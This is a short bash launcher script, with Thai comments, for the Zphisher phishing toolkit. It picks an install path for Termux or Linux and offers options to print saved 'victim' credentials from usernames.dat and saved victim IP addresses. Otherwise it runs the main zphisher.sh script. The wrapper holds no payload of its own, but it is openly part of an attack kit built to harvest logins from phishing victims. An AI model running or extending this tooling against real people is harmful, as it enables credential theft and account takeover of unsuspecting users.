#!/bin/bash

# https://github.com/htr-tech/zphisher

# ตรวจสอบว่าใช้งานบน Android (Termux) หรือไม่
if [[ $(uname -o) == *'Android'* ]]; then
        # กำหนดตำแหน่งของ Zphisher ใน Termux
        ZPHISHER_ROOT="/data/data/com.termux/files/usr/opt/zphisher"
else
        # กำหนดตำแหน่งของ Zphisher ในระบบปฏิบัติการทั่วไป (เช่น Linux)
        export ZPHISHER_ROOT="/opt/zphisher"
fi

# ถ้าผู้ใช้พิมพ์ '-h' หรือ 'help' ให้แสดงข้อมูลช่วยเหลือ
if [[ $1 == '-h' || $1 == 'help' ]]; then
        echo "To run Zphisher type \`zphisher\` in your cmd"
        echo
        echo "Help:"
        echo " -h | help : Print this menu & Exit" # แสดงเมนูช่วยเหลือ
        echo " -c | auth : View Saved Credentials" # ดูข้อมูลการเข้าสู่ระบบที่บันทึกไว้
        echo " -i | ip   : View Saved Victim IP" # ดู IP ของเหยื่อที่บันทึกไว้
        echo
# ถ้าผู้ใช้พิมพ์ '-c' หรือ 'auth' ให้แสดงข้อมูลการเข้าสู่ระบบที่บันทึกไว้
elif [[ $1 == '-c' || $1 == 'auth' ]]; then
        cat $ZPHISHER_ROOT/auth/usernames.dat 2> /dev/null || { 
                echo "No Credentials Found !" # หากไม่พบข้อมูลการเข้าสู่ระบบให้แสดงข้อความนี้
                exit 1
        }
# ถ้าผู้ใช้พิมพ์ '-i' หรือ 'ip' ให้แสดง IP ของเหยื่อที่บันทึกไว้
elif [[ $1 == '-i' || $1 == 'ip' ]]; then
        cat $ZPHISHER_ROOT/auth/ip.txt 2> /dev/null || {
                echo "No Saved IP Found !" # หากไม่พบ IP ที่บันทึกไว้ให้แสดงข้อความนี้
                exit 1
        }
else
        # หากไม่พิมพ์คำสั่งใดๆ ให้เข้าไปที่ตำแหน่ง Zphisher และรันสคริปต์หลัก
        cd $ZPHISHER_ROOT
        bash ./zphisher.sh
fi